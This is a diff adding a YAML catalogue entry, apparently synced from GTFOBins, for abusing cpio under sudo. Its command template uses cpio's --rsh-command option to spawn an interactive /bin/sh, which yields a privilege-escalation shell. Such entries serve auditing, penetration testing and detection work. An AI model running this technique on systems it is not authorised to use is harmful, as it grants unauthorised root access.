@@ -1,0 +1,26 @@
+id: gtfobins/cpio/shell/sudo
+type: binary
+platform: linux
+name: cpio
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''/bin/sh </dev/tty >/dev/tty'' >localhost
+
+    cpio -o --rsh-command /bin/sh -F localhost:'
+references:
+- https://gtfobins.github.io/gtfobins/cpio/
+tags:
+- linux
+- unix
+- gtfobins
